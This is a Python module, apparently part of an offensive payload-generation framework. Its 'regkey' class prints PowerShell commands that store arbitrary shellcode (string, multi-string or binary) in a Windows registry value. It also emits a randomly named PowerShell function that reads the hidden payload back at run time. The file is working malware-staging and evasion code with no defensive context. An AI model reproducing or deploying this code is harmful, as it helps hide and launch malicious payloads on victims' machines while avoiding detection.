import random
import string
import json
from ps1.utils.formatters import *

class regkey:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'path' in arguments:
            self.path = arguments['path']
        else:
            self.path = 'HKCU:\\Software\\'
        if 'key' in arguments:
            self.key = arguments['key']
        else:
            self.key = 'test'
        self.type = type(shellcode).__name__
        if self.type == 'str':
            print(f'Set-ItemProperty -Path "{self.path}" -Name "{self.key}" -Value "{shellcode}"')
        elif self.type == 'list':
            print(f'Set-ItemProperty -Path "{self.path}" -Name "{self.key}" -Type MultiString -Value @({','.join([f"'{x}'" for x in shellcode])})')
        elif self.type == 'bytes':
            print(f'Set-ItemProperty -Path "{self.path}" -Name "{self.key}" -Type Binary -Value {','.join([f'0x{shellcode[i]:02x}' for i in range(0, len(shellcode))])}')

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}')

    def codeblock(self) -> str:
        return f"""

function {self.name} {{
    $obfuscated = (Get-ItemProperty -Path {self.path} -Name {self.key}).{self.key}
    return $obfuscated;
}}
"""